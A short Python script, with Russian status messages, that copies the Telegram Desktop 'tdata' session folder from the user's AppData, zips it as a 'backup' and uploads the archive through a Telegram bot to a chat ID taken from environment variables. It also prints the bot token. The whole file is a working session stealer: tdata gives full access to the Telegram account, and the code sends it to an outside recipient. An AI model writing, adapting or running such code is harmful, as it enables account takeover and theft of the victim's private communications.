import zipfile
import os
import shutil
from dotenv import load_dotenv
from aiogram import Bot
from aiogram.types import FSInputFile

load_dotenv()

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)

async def send_file_to_user(file_path, bot_token, chat_id):
    bot = Bot(token=bot_token)
    async with bot:
        input_file = FSInputFile(file_path)
        await bot.send_document(chat_id, document=input_file)

folder_to_zip = os.path.join(os.getenv('APPDATA'), r'Telegram Desktop\tdata')
temp_folder = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_temp')
output_zip = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_backup.zip')
bot_token = os.getenv('BOT_TOKEN')
chat_id = os.getenv('CHAT_ID')

print(f'BOT_TOKEN: {bot_token}')
print(f'CHAT_ID: {chat_id}')

if os.path.exists(folder_to_zip):
    try:
        if os.path.exists(temp_folder):
            shutil.rmtree(temp_folder)
        shutil.copytree(folder_to_zip, temp_folder)
        zip_folder(temp_folder, output_zip)
        shutil.rmtree(temp_folder)
        print(f'Папка "{folder_to_zip}" успешно скопирована и сжата в "{output_zip}".')

        import asyncio
        asyncio.run(send_file_to_user(output_zip, bot_token, chat_id))
        print('Файл успешно отправлен пользователю.')
    except PermissionError as e:
        print(f'Ошибка доступа: {e}')
    except Exception as e:
        print(f'Произошла ошибка: {e}')